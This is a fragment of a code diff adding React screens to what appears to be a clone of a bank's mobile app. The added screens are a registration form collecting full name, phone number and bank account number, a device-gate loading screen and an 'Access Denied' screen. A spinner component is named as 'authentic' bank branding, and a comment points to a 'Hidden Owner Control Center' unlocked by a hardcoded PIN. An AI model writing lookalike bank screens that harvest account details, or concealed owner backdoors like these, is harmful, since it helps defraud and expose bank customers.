+                    value={regFullName}
+                    onChange={(e) => {
+                      setRegFullName(e.target.value);
+                      if (regError) setRegError('');
+                    }}
+                    placeholder="Enter your full name"
+                    autoComplete="name"
+                    className="w-full px-3.5 py-3 rounded-xl bg-slate-50 border border-slate-200 focus:border-[#7a1c7d] focus:bg-white text-[14px] text-slate-900 outline-none transition-colors"
+                  />
+                </div>
+
+                <div className="space-y-1.5">
+                  <label className="block text-[12px] font-semibold text-slate-700">
+                    Phone Number
+                  </label>
+                  <input
+                    type="tel"
+                    inputMode="tel"
+                    value={regPhone}
+                    onChange={(e) => {
+                      setRegPhone(e.target.value.replace(/[^0-9+]/g, '').slice(0, 15));
+                      if (regError) setRegError('');
+                    }}
+                    placeholder="09XXXXXXXX"
+                    autoComplete="tel"
+                    className="w-full px-3.5 py-3 rounded-xl bg-slate-50 border border-slate-200 focus:border-[#7a1c7d] focus:bg-white text-[14px] text-slate-900 outline-none transition-colors"
+                  />
+                </div>
+
+                <div className="space-y-1.5">
+                  <label className="block text-[12px] font-semibold text-slate-700">
+                    Account Number
+                  </label>
+                  <input
+                    type="text"
+                    inputMode="numeric"
+                    value={regAccount}
+                    onChange={(e) => {
+                      setRegAccount(e.target.value.replace(/\D/g, '').slice(0, 18));
+                      if (regError) setRegError('');
+                    }}
+                    placeholder="1000XXXXXXXXX"
+                    className="w-full px-3.5 py-3 rounded-xl bg-slate-50 border border-slate-200 focus:border-[#7a1c7d] focus:bg-white text-[14px] text-slate-900 outline-none transition-colors"
+                  />
+                </div>
+
+                {regError && (
+                  <p className="text-[12px] font-medium text-rose-600 text-center">
+                    {regError}
+                  </p>
+                )}
+
+                <button
+                  type="submit"
+                  disabled={regSubmitting}
+                  className="w-full py-3.5 rounded-xl bg-[#7a1c7d] hover:bg-[#661468] active:scale-[0.99] text-white font-bold text-[15px] shadow-md transition-all cursor-pointer disabled:opacity-60"
+                >
+                  Next
+                </button>
+              </form>
+            </div>
+          </div>
+        )}
+
+        {deviceGateState === 'pending' && (
+          <div className="absolute inset-0 z-[92] bg-[#f7f4f8] flex flex-col items-center justify-center p-6 select-none">
+            <div className="bg-white rounded-3xl shadow-xl border border-purple-100 px-8 py-7 flex flex-col items-center text-center gap-4 max-w-[280px] w-full">
+              <CBEAuthenticSpinner size={44} color="#7a1c7d" speed={0.95} />
+              <p className="text-[14px] font-semibold text-slate-700">
+                Loading...
+              </p>
+            </div>
+          </div>
+        )}
+
+        {deviceGateState === 'rejected' && (
+          <div className="absolute inset-0 z-[92] bg-[#140717] text-white flex flex-col items-center justify-center p-6 text-center select-none">
+            <div className="w-14 h-14 rounded-full bg-rose-500/20 border border-rose-400/30 flex items-center justify-center mb-3">
+              <X className="w-7 h-7 text-rose-400" />
+            </div>
+            <p className="text-[15px] font-bold text-white">Access Denied</p>
+          </div>
+        )}
 
         {/* Hidden Owner Control Center (Opened exclusively with PIN 0069 on Login Step 3) */}
         <AnimatePresence>
